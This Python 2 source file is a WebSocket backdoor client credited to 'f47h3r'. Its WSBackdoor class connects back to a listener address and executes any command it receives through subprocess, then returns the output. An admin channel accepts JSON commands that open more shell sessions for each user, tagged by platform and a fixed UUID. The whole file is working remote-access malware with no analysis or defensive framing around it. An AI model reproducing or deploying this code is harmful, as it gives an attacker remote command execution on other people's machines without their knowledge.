#!/usr/bin/env python
# -*- coding: utf-8 -*-
from ws4py.client.threadedclient import WebSocketClient
from socket import gethostname
import subprocess
import optparse
import os
#from clint.packages.colorama.win32 import STDERR
import json
import platform


__author__ = "f47h3r - Chase Schultz"

UUID = '6faf6300-7318-11e1-b0c4-0800200c9a66'
users = []
ip = ''
port = ''
listeners = []
adminListeners = []


class WSBackdoor(WebSocketClient):

    def __execute__(self, cmd, args=None):
            try:
                proc = subprocess.Popen(cmd, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdout = proc.stdout.read() + proc.stderr.read()
            except Exception, err:
                stdout = str(err)
                print stdout
            return stdout

    def changeDir(self, args):
        path = os.path.abspath(args)
        if os.path.exists(path) and os.path.isdir(path):
            os.chdir(path)
            return True
        else:
            return False

    def opened(self):
        self.send("Hello Server! - From Shell Runner Client\n")

    def closed(self, code, reason):
        print "Closed down", code, reason

    def received_message(self, cmd):
        self.cwd = os.getcwd()
        print "Received Message: %s Length: %d" % (str(cmd), len(cmd))
        cmd = str(cmd)
        command = cmd.split()
        if command[0] == 'cd':
            self.changeDir(command[1])
        else:
            print command
            response = self.__execute__(command)
            self.send(response)


class AdminWebsocket(WebSocketClient):
    '''Websocket Manager'''
    def __addListeners__(self, webSocket):
            adminListeners.append(webSocket)

    def opened(self):
        self.send("Hello Server! - From Client Admin Websockets\n")
        print 'adding the socket to adminListeners list'
        self.__addListeners__(self)

    def closed(self, code, reason):
        print "Closed down", code, reason

    def received_message(self, jsonObject):
        print 'RECEIVED ON ADMIN INTERFACE:\n\n %s' % str(jsonObject)
        processor = jsonObjectProccessor()
        processor.processObject(jsonObject)


class jsonObjectProccessor():
    '''Process Json Command Objects'''
    def __spawnHandler__(self, jsonDict):
        print 'Made it to Spawnhandler! - Reminder CLEAN THIS SHIT UP!'
        group = str(platform.system())
        print 'Detected Platform: %s' % group
        print 'json user: %s' % jsonDict['user']
        ws = WSBackdoor('http://' + ip + ':' + port + '/endpoint/' + group + '/' + UUID + '/' + jsonDict['user'], protocols=['http-only', 'chat'])
        ws.connect()
        listeners.append(ws)

    def processObject(self, jsonObject):
        jsonObject = str(jsonObject)
        decoded = json.loads(jsonObject)
        print 'JSON OBJECT TYPE: ', type(decoded[0])
        jsonDict = decoded[0]
        print 'Command Dictionary: ', jsonDict
        print 'Command: %s' % jsonDict['command']
        if jsonDict['command'] == 'spawnwebsocket':
            self.__spawnHandler__(jsonDict)

if __name__ == '__main__':
    usage = __doc__
    author = __author__
    version = "0.01"
    parser = optparse.OptionParser(usage, None, optparse.Option, version)
    parser.add_option('-p',
                      '--port',
                      default='9002',
                      dest='port',
                      help='Listener Port')
    parser.add_option('-l',
                      '--listen',
                      default='127.0.0.1',
                      dest='ip',
                      help='Listener IP address')
    (options, args) = parser.parse_args()
    ip = options.ip
    port = options.port
    hostname = gethostname()
    platform = platform.system()
    print 'Hostname: %s' % hostname
    try:
        adminWebsocket = AdminWebsocket('http://' + options.ip + ':' + options.port + '/endpoint/admin/%s/%s/6faf6300-7318-11e1-b0c4-0800200c9a66' % (hostname, platform), protocols=['http-only', 'chat'])
        adminWebsocket.daemon = True
        adminWebsocket.connect()
        '''Remove below statement'''
        #adminWebsocket.addListeners(adminWebsocket)
    except KeyboardInterrupt:
        for socket in adminListeners:
            print 'socket being closed on client side...shit'
            socket.close()

        for socket in listeners:
            socket.close()
